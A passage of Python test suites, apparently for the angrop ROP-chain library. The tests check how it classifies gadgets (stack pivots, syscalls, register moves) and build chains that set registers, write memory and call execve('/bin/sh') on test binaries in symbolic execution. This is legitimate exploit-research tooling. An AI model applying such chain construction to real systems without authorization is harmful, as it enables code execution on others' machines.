    4c1e8e  ldr     r1, [r4,#0x14]
    4c1e90  str     r5, [r4,#0x10]
    4c1e92  add     r1, r5
    4c1e94  str     r1, [r4,#0x14]
    4c1e96  pop     {r3, r4, r5, pc}
    """
    gadget = rop.analyze_gadget(0x4c1e8e+1) # thumb mode
    assert gadget.mem_changes

def test_pivot_gadget():
    # pylint: disable=pointless-string-statement

    proj = angr.Project(os.path.join(BIN_DIR, "tests", "i386", "i386_glibc_2.35"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    """
    5719da  pop     esp
    5719db  ret
    """
    gadget = rop.analyze_gadget(0x5719da)
    assert gadget.stack_change == 0x4
    assert gadget.stack_change_before_pivot == 0x4
    assert gadget.stack_change_after_pivot == 0x4
    assert len(gadget.sp_controllers) == 1
    assert len(gadget.sp_reg_controllers) == 0

    chain = rop.pivot(0x600000)
    assert chain

    proj = angr.Project(os.path.join(BIN_DIR, "tests", "i386", "bronze_ropchain"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    """
    80488e8  leave
    80488e9  ret
    """
    gadget = rop.analyze_gadget(0x80488e8)
    assert type(gadget) == PivotGadget
    assert gadget.stack_change == 0
    assert gadget.stack_change_before_pivot == 0
    assert gadget.stack_change_after_pivot == 0x8
    assert len(gadget.sp_controllers) == 1 and gadget.sp_controllers.pop() == 'ebp'


    """
    8048592  xchg    esp, eax
    8048593  ret     0xca21
    """
    gadget = rop.analyze_gadget(0x8048592)
    assert not gadget

    """
    8048998  pop     ecx
    8048999  pop     ebx
    804899a  pop     ebp
    804899b  lea     esp, [ecx-0x4]
    804899e  ret
    """
    gadget = rop.analyze_gadget(0x8048998)
    assert type(gadget) == PivotGadget
    assert gadget.stack_change == 0xc
    assert gadget.stack_change_before_pivot == 0xc
    assert gadget.stack_change_after_pivot == 0x4
    assert len(gadget.sp_controllers) == 1 and gadget.sp_controllers.pop().startswith('symbolic_stack_')

    """
    8048fd6  xchg    esp, eax
    8048fd7  ret
    """
    gadget = rop.analyze_gadget(0x8048fd6)
    assert type(gadget) == PivotGadget
    assert gadget.stack_change == 0
    assert gadget.stack_change_before_pivot == 0
    assert gadget.stack_change_after_pivot == 0x4
    assert len(gadget.sp_controllers) == 1 and gadget.sp_controllers.pop() == 'eax'

    """
    8052cac  lea     esp, [ebp-0xc]
    8052caf  pop     ebx
    8052cb0  pop     esi
    8052cb1  pop     edi
    8052cb2  pop     ebp
    8052cb3  ret
    """
    gadget = rop.analyze_gadget(0x8052cac)
    assert type(gadget) == PivotGadget
    assert gadget.stack_change == 0
    assert gadget.stack_change_before_pivot == 0
    assert gadget.stack_change_after_pivot == 0x14
    assert len(gadget.sp_controllers) == 1 and gadget.sp_controllers.pop() == 'ebp'

    """
    805658c  add    BYTE PTR [eax],al
    805658e  pop    ebx
    805658f  pop    esi
    8056590  pop    edi
    8056591  ret
    """
    gadget = rop.analyze_gadget(0x805658c)
    assert type(gadget) == RopGadget
    assert gadget.stack_change == 0x10 # 3 pops + 1 ret

    proj = angr.Project(os.path.join(BIN_DIR, "tests", "armel", "libc-2.31.so"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, is_thumb=True)

    """
    4c7b5a  mov     sp, r7
    4c7b5c  pop.w   {r4, r5, r6, r7, r8, sb, sl, fp, pc}
    """

    #rop.find_gadgets(show_progress=False)
    gadget = rop.analyze_gadget(0x4c7b5a+1)
    assert type(gadget) == PivotGadget
    assert gadget.stack_change == 0
    assert gadget.stack_change_before_pivot == 0
    assert gadget.stack_change_after_pivot == 0x24
    assert len(gadget.sp_controllers) == 1 and gadget.sp_controllers.pop() == 'r7'

    proj = angr.Project(os.path.join(BIN_DIR, "tests", "armel", "manysum"), load_options={"auto_load_libs": False})
    rop = proj.analyses.ROP()

    """
    1040c  mov     r0, r3
    10410  sub     sp, fp, #0x0
    10414  pop     {fp}
    10418  bx      lr
    """
    gadget = rop.analyze_gadget(0x1040c)
    assert type(gadget) == PivotGadget
    assert gadget.stack_change == 0
    assert gadget.stack_change_before_pivot == 0
    assert gadget.stack_change_after_pivot == 0x4
    assert len(gadget.sp_controllers) == 1 and gadget.sp_controllers.pop() == 'r11'

def test_syscall_gadget():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "i386", "i386_glibc_2.35"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    gadget = rop.analyze_gadget(0x437765)
    assert type(gadget) == SyscallGadget
    assert gadget.stack_change == 0
    assert not gadget.can_return

    gadget = rop.analyze_gadget(0x5212f6)
    assert type(gadget) == SyscallGadget
    assert gadget.stack_change == 0
    assert not gadget.can_return

    proj = angr.Project(os.path.join(BIN_DIR, "tests", "i386", "bronze_ropchain"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    gadget = rop.analyze_gadget(0x0806f860)
    assert type(gadget) == SyscallGadget
    assert gadget.stack_change == 0x4
    assert gadget.can_return

    gadget = rop.analyze_gadget(0x0806f85e)
    assert type(gadget) == SyscallGadget
    assert gadget.stack_change == 0x4
    assert gadget.can_return

    gadget = rop.analyze_gadget(0x080939e3)
    assert type(gadget) == SyscallGadget
    assert gadget.stack_change == 0x0
    assert not gadget.can_return

    gadget = rop.analyze_gadget(0x0806f2f1)
    assert type(gadget) == SyscallGadget
    assert gadget.stack_change == 0x0
    assert not gadget.can_return

    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "roptest"), auto_load_libs=False)
    rop = proj.analyses.ROP()
    gadget = rop.analyze_gadget(0x4000c1)
    assert type(gadget) == SyscallGadget
    assert gadget.stack_change == 0
    assert not gadget.can_return

    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False)

    gadget = rop.analyze_gadget(0x4c1330)
    assert type(gadget) == SyscallGadget
    assert gadget.stack_change == 0
    assert not gadget.can_return
    assert len(gadget.prologue.concrete_regs) == 1 and gadget.prologue.concrete_regs.pop('rax') == 0x3b

    gadget = rop.analyze_gadget(0x521cef)
    assert type(gadget) == RopGadget
    assert len(gadget.mem_writes) == 1
    mem_write = gadget.mem_writes[0]
    assert mem_write.addr_offset == 0x68
    assert len(mem_write.addr_controllers) == 1 and 'rdx' in mem_write.addr_controllers
    assert len(mem_write.data_controllers) == 1 and 'rcx' in mem_write.data_controllers

    gadget = rop.analyze_gadget(0x4c1437)
    assert type(gadget) == SyscallGadget
    assert gadget.stack_change == 0
    assert not gadget.can_return
    assert len(gadget.prologue.concrete_regs) == 1 and gadget.prologue.concrete_regs.pop('rax') == 0x3b

    gadget = rop.analyze_gadget(0x536715)
    assert type(gadget) == SyscallGadget
    assert gadget.stack_change == 0
    assert not gadget.can_return
    assert len(gadget.prologue.concrete_regs) == 1 and gadget.prologue.concrete_regs.pop('rsi') == 0x81

    proj = angr.Project(os.path.join(BIN_DIR, "tests", "cgc", "sc1_0b32aa01_01"), auto_load_libs=False)
    rop = proj.analyses.ROP()
    g = rop.analyze_gadget(0x0804843c)
    assert g.prologue and isinstance(g, RopGadget)

def test_pop_pc_gadget():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "mipsel", "darpa_ping"), auto_load_libs=False)
    rop = proj.analyses.ROP()
    gadget = rop.analyze_gadget(0x404e98)
    assert gadget.transit_type == 'pop_pc'
    assert gadget.pc_offset == 0x28

    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "angrop_retn_test"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    gadget = rop.analyze_gadget(0x40113a)
    assert gadget.transit_type == 'pop_pc'
    assert gadget.pc_offset == 0
    assert gadget.stack_change == 0x18

def test_reg_moves():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "arjsfxjr"), auto_load_libs=False)
    rop = proj.analyses.ROP()
    gadget = rop.analyze_gadget(0x4027c4) # mov esi, esi; mov edi, r15d; call qword ptr [r12 + rbx*8]
    assert len(gadget.reg_moves) == 1

    proj = angr.Project(os.path.join(BIN_DIR, "tests", "aarch64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=True, only_check_near_rets=False)
    g = rop.analyze_gadget(0x4ebad4)
    assert len(g.reg_moves) == 1

def test_oop_access():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "i386", "bronze_ropchain"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    for addr in [0x0806b397, 0x0806b395, 0x08091dd2, 0x08091f5a]:
        g = rop.analyze_gadget(addr)
        assert g and g.oop

def test_negative_stack_change():
    # pylint: disable=pointless-string-statement
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "armel", "libc-2.31.so"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, is_thumb=True)

    # this is not a gadget because it is loading uninitialized memory
    """
    sub sp, #0x50
    add fp, pc
    b #0x4bf669
    ldr r3, [sp, #8]
    mov r2, r7
    mov r1, r6
    mov r0, r5
    str r3, [sp]
    mov r3, r8
    blx r4
    """
    g = rop.analyze_gadget(0x4bf661)
    assert g is None

def test_arm_jmp_mem():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "armel", "libc-2.31.so"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, is_thumb=True)
    g = rop.analyze_gadget(0x456951)
    assert g is None

def test_num_mem_access():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "cgc", "sc1_0b32aa01_01"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, max_sym_mem_access=2)

    g = rop.analyze_gadget(0x8048500)
    assert g is not None
    assert g.has_symbolic_access() is True
    assert g.num_sym_mem_access == 2
    assert len(g.mem_changes) == 2

def test_pac():
    # pylint: disable=pointless-string-statement
    """
    add sp, sp, #0xc0
    autiasp
    ret
    """
    proj = angr.load_shellcode(
        b'\xffC\x01\x91\xbf#\x03\xd5\xc0\x03_\xd6',
        "aarch64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)

    assert len(rop._all_gadgets) == 1

def test_riscv():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "riscv", "abgate-libabGateQt.so"),
                        load_options={'main_opts':{'base_addr': 0}},
                        )
    rop = proj.analyses.ROP(fast_mode=False, cond_br=True, max_bb_cnt=5)
    gs = rop.analyze_addr(0x5f7a)
    g = gs[0]
    assert 's0' in g.popped_regs

def test_out_of_patch():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    # 0x000000000007c950 : mov rax, qword ptr [rip + 0x342849] ; ret
    g = rop.analyze_gadget(0x000000000047c950)
    assert g.oop is False

def test_controller():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64/datadep_test"), auto_load_libs=False)
    rop = proj.analyses.ROP()
    g = rop.analyze_gadget(0x400614)

    assert 'rax' in g.reg_controllers
    s = g.reg_controllers['rax']
    assert len(s) == 1 and 'rax' in s

    assert 'rbx' in g.reg_controllers
    s = g.reg_controllers['rbx']
    assert len(s) == 2 and 'rbx' in s and 'rsi' in s

    proj = angr.Project(os.path.join(BIN_DIR, "tests", "armel/manysum"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    g = rop.analyze_gadget(0x10558)
    assert not g.reg_controllers

def test_cdq():
    proj = angr.load_shellcode(
        """
        pop rax
        cdq
        ret
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, max_sym_mem_access=1)
    g = rop.analyze_gadget(0x400000)
    assert g is not None
    assert 'rax' in g.popped_regs
    assert 'rdx' not in g.popped_regs

def test_invalid_ptr():
    proj = angr.load_shellcode(
        """
        pop rcx; xor al, 0x52; movabs byte ptr [0xc997d3941b683390], al; ret
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, max_sym_mem_access=1)
    g = rop.analyze_gadget(0x400000)
    assert g is None

def test_cond_br_guard_pop_conflict():
    proj = angr.load_shellcode(
        """
        ldr x3, [sp, #0x10];
        mov x15, x3;
        add x3, x3, #2;
        str x3, [sp, #0x10];
        ldr x24, [sp, #0x18];
        cmp x15, x24;
        b.eq #0x24;
        str x1, [x0];
        str x1, [x1];
        mov x0, #1;
        ldr x30, [sp, #0x28];
        add sp, sp, #0x30;
        ret
        """,
        "aarch64",
        load_address=0,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, max_sym_mem_access=1)
    gs = rop.analyze_addr(0)
    assert len(gs) == 1
    g = gs[0]
    assert not g.reg_pops

def test_riscv_zero_register():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "riscv",
                                     "borgbackup2-chunker.cpython-312-riscv64-linux-gnu.so"),
                        load_options={'main_opts':{'base_addr': 0}})
    rop = proj.analyses.ROP(fast_mode=False, max_bb_cnt=5, cond_br=True)

    gs = rop.analyze_addr(0x0000000000011f32)
    assert len(gs) == 1

def run_all():
    functions = globals()
    all_functions = {x:y for x, y in functions.items() if x.startswith('test_')}
    for f in sorted(all_functions.keys()):
        print(f)
        if hasattr(all_functions[f], '__call__'):
            all_functions[f]()

if __name__ == "__main__":
    import sys
    import logging

    logging.getLogger("angrop.rop").setLevel(logging.DEBUG)
    #logging.getLogger("angrop.gadget_analyzer").setLevel(logging.DEBUG)

    if len(sys.argv) > 1:
        globals()['test_' + sys.argv[1]]()
    else:
        run_all()

```

`tests/test_performance.py`:

```py
import os
import time
import logging

import angr
import angrop # pylint: disable=unused-import

logging.getLogger("cle").setLevel("ERROR")

BIN_DIR = os.path.join(os.path.dirname(__file__), "..", "..", "binaries")
CACHE_DIR = os.path.join(BIN_DIR, 'tests_data', 'angrop_gadgets_cache')

def local_gadget_finding():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "armel/libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    start = time.time()
    rop.find_gadgets(processes=16, optimize=False)
    assert time.time() - start < 20

    start = time.time()
    rop.optimize(processes=16)
    assert time.time() - start < 5

    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64/libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    start = time.time()
    rop.find_gadgets(processes=16, optimize=False)
    assert time.time() - start < 35

    start = time.time()
    rop.optimize(processes=16)
    assert time.time() - start < 5

def local_graph_optimization_missing_write():
    """
    this binary does not contain enough gadgets to form a write chain
    """
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64/manywords"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    start = time.time()
    rop.find_gadgets(processes=16, optimize=False)
    assert time.time() - start < 5

    start = time.time()
    rop.optimize(processes=16)
    assert time.time() - start < 1

def local_graph_optimization():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64/ALLSTAR_389-dsgw_csearch"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False)

    start = time.time()
    rop.find_gadgets(processes=16, optimize=False)
    assert time.time() - start < 15

    # this is about 25-26s
    start = time.time()
    rop.optimize(processes=16)
    assert time.time() - start < 35

def local_write_optimize():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64/ALLSTAR_389-dsgw_csearch"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    cache = '/tmp/ALLSTAR_389-dsgw_csearch.cache'
    if os.path.exists(cache):
        rop.load_gadgets(cache, optimize=False)
    else:
        rop.find_gadgets(processes=16, show_progress=True, optimize=False)
        rop.save_gadgets(cache)

    start = time.time()
    for _ in range(20):
        rop.write_to_mem(0x41414141, b'AAAAAAA')
    print(time.time() - start)

def run_all():
    functions = globals()
    all_functions = {x:y for x, y in functions.items() if x.startswith('test_')}
    for f in sorted(all_functions.keys()):
        print(f)
        if hasattr(all_functions[f], '__call__'):
            all_functions[f]()
    print("local_gadget_finding")
    local_gadget_finding()
    print("local_graph_optimization_missing_write")
    local_graph_optimization_missing_write()
    print("local_graph_optimization")
    local_graph_optimization()
    print("local_write_optimize")
    local_write_optimize()

if __name__ == "__main__":
    import sys

    logging.getLogger("angrop.rop").setLevel(logging.DEBUG)
    #logging.getLogger("angrop.gadget_analyzer").setLevel(logging.DEBUG)

    if len(sys.argv) > 1:
        globals()['test_' + sys.argv[1]]()
    else:
        run_all()

```

`tests/test_rop.py`:

```py
import os
import pickle
import logging

import claripy
import angr
import angrop  # pylint: disable=unused-import

l = logging.getLogger("angrop.tests.test_rop")

public_bin_location = os.path.join(os.path.dirname(os.path.realpath(__file__)), '../../binaries/tests')
test_data_location = os.path.join(public_bin_location, "..", "tests_data", "angrop_gadgets_cache")


"""
Suggestions on how to debug angr changes that break angrop.

If the gadget is completely missing after your changes. Pick the address that didn't work and run the following.
The logging should say why the gadget was discarded.

rop = p.analyses.ROP()
angrop.gadget_analyzer.l.setLevel("DEBUG")
rop._gadget_analyzer.analyze_gadget(addr)

If a gadget is missing memory reads / memory writes / memory changes, the actions are probably missing.
Memory changes require a read action followed by a write action to the same address.
"""


def assert_mem_access_equal(m1, m2):
    assert set(m1.addr_dependencies) ==set(m2.addr_dependencies)
    assert set(m1.addr_controllers) == set(m2.addr_controllers)
    assert set(m1.data_dependencies) == set(m2.data_dependencies)
    assert set(m1.data_controllers) == set(m2.data_controllers)
    assert m1.addr_constant == m2.addr_constant
    assert m1.data_constant == m2.data_constant
    assert m1.addr_size == m2.addr_size
    assert m1.data_size == m2.data_size


def assert_gadgets_equal(known_gadget, test_gadget):
    assert known_gadget.addr == test_gadget.addr
    assert known_gadget.changed_regs == test_gadget.changed_regs
    assert known_gadget.popped_regs == test_gadget.popped_regs
    assert known_gadget.reg_dependencies == test_gadget.reg_dependencies
    assert known_gadget.reg_controllers == test_gadget.reg_controllers
    assert known_gadget.stack_change == test_gadget.stack_change

    assert len(known_gadget.mem_reads) == len(test_gadget.mem_reads)
    for m1, m2 in zip(known_gadget.mem_reads, test_gadget.mem_reads):
        assert_mem_access_equal(m1, m2)
    assert len(known_gadget.mem_writes) == len(test_gadget.mem_writes)
    for m1, m2 in zip(known_gadget.mem_writes, test_gadget.mem_writes):
        assert_mem_access_equal(m1, m2)
    assert len(known_gadget.mem_changes) == len(test_gadget.mem_changes)
    for m1, m2 in zip(known_gadget.mem_changes, test_gadget.mem_changes):
        assert_mem_access_equal(m1, m2)

    assert known_gadget.addr == test_gadget.addr
    assert known_gadget.changed_regs == test_gadget.changed_regs


def compare_gadgets(test_gadgets, known_gadgets):
    test_gadgets = sorted(test_gadgets, key=lambda x: x.addr)
    known_gadgets = sorted(known_gadgets, key=lambda x: x.addr)

    # we allow new gadgets to be found, but only check the correctness of those that were there in the known_gadgets
    # so filter new gadgets found
    expected_addrs = set(g.addr for g in known_gadgets)
    test_gadgets = [g for g in test_gadgets if g.addr in expected_addrs]

    # check that each of the expected gadget addrs was found as a gadget
    # if it wasn't the best way to debug is to run:
    # angrop.gadget_analyzer.l.setLevel("DEBUG"); rop._gadget_analyzer.analyze_gadget(addr)
    test_gadget_dict = {}
    for g in test_gadgets:
        test_gadget_dict.setdefault(g.addr, []).append(g)

    found_addrs = set(g.addr for g in test_gadgets)
    for g in known_gadgets:
        assert g.addr in found_addrs

    # So now we should have
    assert len(test_gadgets) == len(known_gadgets)

    # check gadgets
    for g in known_gadgets:
        matching_gadgets = [
            test_gadget
            for test_gadget in test_gadget_dict[g.addr]
            if test_gadget.bbl_addrs == g.bbl_addrs
        ]
        assert len(matching_gadgets) == 1, matching_gadgets
        assert_gadgets_equal(g, matching_gadgets[0])

def execute_chain(project, chain):
    s = project.factory.blank_state()
    s.memory.store(s.regs.sp, chain.payload_str())
    goal_idx = chain.next_pc_idx()
    s.memory.store(
        s.regs.sp
        + (chain.payload_len if goal_idx is None else goal_idx * project.arch.bytes),
        b"A" * project.arch.bytes,
    )
    s.ip = s.stack_pop()
    p = project.factory.simulation_manager(s)
    goal_addr = 0x4141414141414141 % (1 << project.arch.bits)
    while p.one_active.addr != goal_addr:
        p.step()
        assert len(p.active) == 1

    return p.one_active

def verify_execve_chain(chain):
    state = chain._blank_state.copy()
    proj = state.project
    state.memory.store(state.regs.sp, chain.payload_str())
    state.ip = state.stack_pop()

    # step to the system call
    simgr = proj.factory.simgr(state)
    while simgr.active:
        assert len(simgr.active) == 1
        state = simgr.active[0]
        obj = proj.loader.find_object_containing(state.ip.concrete_value)
        if obj and obj.binary == 'cle##kernel':
            break
        simgr.step()

    # verify the syscall arguments
    state = simgr.active[0]
    cc = angr.SYSCALL_CC[proj.arch.name]["default"](proj.arch)
    assert cc.syscall_num(state).concrete_value == chain._builder.arch.execve_num
    ptr = state.registers.load(cc.ARG_REGS[0])
    assert state.solver.is_true(state.memory.load(ptr, 8) == b'/bin/sh\0')
    assert state.registers.load(cc.ARG_REGS[1]).concrete_value == 0
    assert state.registers.load(cc.ARG_REGS[2]).concrete_value == 0

def test_roptest_mips():
    proj = angr.Project(os.path.join(public_bin_location, "mipsel/darpa_ping"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=True)
    rop.find_gadgets_single_threaded(show_progress=False)

    chain = rop.set_regs(s0=0x41414142, s1=0x42424243, v0=0x43434344)
    result_state = execute_chain(proj, chain)
    assert result_state.solver.eval(result_state.regs.s0) == 0x41414142
    assert result_state.solver.eval(result_state.regs.s1) == 0x42424243
    assert result_state.solver.eval(result_state.regs.v0) == 0x43434344


def test_rop_x86_64():
    b = angr.Project(os.path.join(public_bin_location, "x86_64/datadep_test"), auto_load_libs=False)
    rop = b.analyses.ROP()
    rop.find_gadgets_single_threaded(show_progress=False)

    cache_path = os.path.join(test_data_location, "datadep_test_gadgets")
    if not os.path.exists(cache_path):
        rop.save_gadgets(cache_path)

    # check gadgets
    with open(cache_path, "rb") as f:
        tup = pickle.load(f)
        compare_gadgets(rop._all_gadgets, tup[0])

    # test creating a rop chain
    chain = rop.set_regs(rbp=0x1212, rbx=0x1234567890123456)
    # smallest possible chain
    assert chain.payload_len == 32
    # chain is correct
    result_state = execute_chain(b, chain)
    assert result_state.solver.eval(result_state.regs.rbp) == 0x1212
    assert result_state.solver.eval(result_state.regs.rbx) == 0x1234567890123456

    # test setting the filler value
    rop.set_roparg_filler(0x4141414141414141)
    chain = rop.set_regs(rbx=0x121212)
    assert chain._concretize_chain_values()[2][0] == 0x4141414141414141


def test_rop_i386_cgc():
    b = angr.Project(os.path.join(public_bin_location, "cgc/sc1_0b32aa01_01"), auto_load_libs=False)
    rop = b.analyses.ROP()
    rop.find_gadgets_single_threaded(show_progress=False)

    cache_path = os.path.join(test_data_location, "0b32aa01_01_gadgets")
    if not os.path.exists(cache_path):
        rop.save_gadgets(cache_path)

    # check gadgets
    with open(os.path.join(test_data_location, "0b32aa01_01_gadgets"), "rb") as f:
        tup = pickle.load(f)
        compare_gadgets(rop._all_gadgets, tup[0])

    # test creating a rop chain
    chain = rop.set_regs(ebx=0x98765432, ecx=0x12345678)
    # smallest possible chain
    assert chain.payload_len == 16
    # chain is correct
    result_state = execute_chain(b, chain)
    assert result_state.solver.eval(result_state.regs.ebx) == 0x98765432
    assert result_state.solver.eval(result_state.regs.ecx) == 0x12345678

    # test memwrite chain
    chain = rop.write_to_mem(0x41414141, b"ABCDEFGH")
    result_state = execute_chain(b, chain)
    assert result_state.solver.eval(result_state.memory.load(0x41414141, 8), cast_to=bytes) == b"ABCDEFGH"

def test_rop_arm():
    b = angr.Project(os.path.join(public_bin_location, "armel/manysum"), load_options={"auto_load_libs": False})
    rop = b.analyses.ROP()
    rop.find_gadgets_single_threaded(show_progress=False)

    cache_path = os.path.join(test_data_location, "arm_manysum_test_gadgets")
    if not os.path.exists(cache_path):
        rop.save_gadgets(cache_path)

    # check gadgets
    with open(os.path.join(test_data_location, "arm_manysum_test_gadgets"), "rb") as f:
        tup = pickle.load(f)
        compare_gadgets(rop._all_gadgets, tup[0])

    # test creating a rop chain
    chain = rop.set_regs(r11=0x99887766)
    # smallest possible chain
    assert chain.payload_len == 12
    # correct chains, using a more complicated chain here
    chain = rop.set_regs(r4=0x99887766, r9=0x44556677, r11=0x11223344)
    result_state = execute_chain(b, chain)
    assert result_state.solver.eval(result_state.regs.r4) == 0x99887766
    assert result_state.solver.eval(result_state.regs.r9) == 0x44556677
    assert result_state.solver.eval(result_state.regs.r11) == 0x11223344

    # test memwrite chain
    chain = rop.write_to_mem(0x41414141, b"ABCDEFGH")
    result_state = execute_chain(b, chain)
    assert result_state.solver.eval(result_state.memory.load(0x41414141, 8), cast_to=bytes) == b"ABCDEFGH"

def test_roptest_x86_64():
    p = angr.Project(os.path.join(public_bin_location, "x86_64/roptest"), auto_load_libs=False)
    r = p.analyses.ROP(only_check_near_rets=False)
    r.find_gadgets_single_threaded(show_progress=False)
    c = r.execve(path=b"/bin/sh")
    verify_execve_chain(c)

def test_roptest_aarch64():
    # pylint: disable=pointless-string-statement
    cache_path = os.path.join(test_data_location, "aarch64_glibc_2.19")
    proj = angr.Project(os.path.join(public_bin_location, "aarch64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=True, only_check_near_rets=False)

    """
    0x4b7ca8: ldp x19, x30, [sp]; add sp, sp, #0x20; ret
    0x4ebad4: add x0, x19, #0x260; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret
    """
    rop.analyze_gadget(0x4b7ca8)
    rop.analyze_gadget(0x4ebad4)
    rop.chain_builder.optimize()

    data = claripy.BVS("data", 64)
    chain = rop.set_regs(x0=data)
    assert chain is not None
    chain._blank_state.solver.add(data == 0x41414141)
    assert b'\xe1\x3eAA' in chain.payload_str()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.write_to_mem(0x41414140, b'AAAAAAA')
    assert chain is not None

    chain = rop.execve(path=b'/bin/sh')
    verify_execve_chain(chain)

def test_acct_sa():
    """
    just a system test
    """
    proj = angr.Project(os.path.join(public_bin_location, "x86_64", "ALLSTAR_acct_sa"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    cache_path = os.path.join(test_data_location, "ALLSTAR_acct_sa")

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.set_regs(rax=0x41414141)
    assert chain is not None
    state = chain.exec()
    assert state.regs.rax.concrete_value == 0x41414141

    chain = rop.func_call(0xdeadbeef, [0x41414141, 0x42424242, 0x43434343])
    assert chain is not None
    state = chain.concrete_exec_til_addr(0xdeadbeef)
    assert state.regs.rdi.concrete_value == 0x41414141
    assert state.regs.rsi.concrete_value == 0x42424242
    assert state.regs.rdx.concrete_value == 0x43434343

def test_liblog():
    """
    yet another system test
    the difficulty here is that it needs to be able to normalize a jmp_mem gadget that requries moves
    """
    proj = angr.Project(os.path.join(public_bin_location, "x86_64",
                                     "ALLSTAR_android-libzipfile-dev_liblog.so.0.21.0"),
                        auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    cache_path = os.path.join(test_data_location, "ALLSTAR_liblog")

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    chain = rop.set_regs(rdx=0x41414141)
    assert chain is not None

    chain = rop.func_call(0xdeadbeef, [0x41414141, 0x42424242, 0x43434343])
    assert chain is not None

def run_all():
    functions = globals()
    all_functions = {x:y for x, y in functions.items() if x.startswith('test_')}
    for f in sorted(all_functions.keys()):
        if hasattr(all_functions[f], '__call__'):
            print(f)
            all_functions[f]()


if __name__ == "__main__":
    logging.getLogger("angrop.rop").setLevel(logging.DEBUG)

    import sys
    if len(sys.argv) > 1:
        globals()['test_' + sys.argv[1]]()
    else:
        run_all()

```

`tests/test_ropblock.py`:

```py
import os

import angr
import angrop # pylint: disable=unused-import
from angrop.rop_block import RopBlock
from angrop.errors import RopException

BIN_DIR = os.path.join(os.path.dirname(__file__), "..", "..", "binaries")
CACHE_DIR = os.path.join(BIN_DIR, 'tests_data', 'angrop_gadgets_cache')

def test_ropblock():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "mipsel", "darpa_ping"), auto_load_libs=False)
    rop = proj.analyses.ROP()
    gadget = rop.analyze_gadget(0x404e98)
    rb = RopBlock.from_gadget(gadget, rop.chain_builder._reg_setter)
    assert rb.next_pc_idx() == 11

def test_reg_mover():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=True, only_check_near_rets=False)

    g1 = rop.analyze_gadget(0x46f562) # mov rax, rbp; pop rbp; pop r12; ret
    g2 = rop.analyze_gadget(0x524a50) # push rax; mov eax, 1; pop rbx; pop rbp; pop r12; ret
    assert g1 is not None and g2 is not None

    rb = RopBlock.from_gadget_list([g1, g2], rop.chain_builder._reg_mover)
    assert len(rb.reg_moves) == 1
    move = rb.reg_moves[0]
    assert move.from_reg == 'rbp'
    assert move.to_reg == 'rbx'
    assert move.bits == 64

    chain = rop.move_regs(rbx='rbp')
    chain._blank_state.regs.rbp = 0x41414141

    state = chain.exec()
    assert state.regs.rbx.concrete_value == 0x41414141

    # this should fail
    try:
        chain = rop.move_regs(rbx='rbp', rax='rbp')
        assert chain is None
    except RopException:
        pass

def test_expand_ropblock():
    proj = angr.load_shellcode(
        """
        pop rdi; ret
        mov eax, edi; ret
        pop rbx; ret
        add rsp, 8; ret
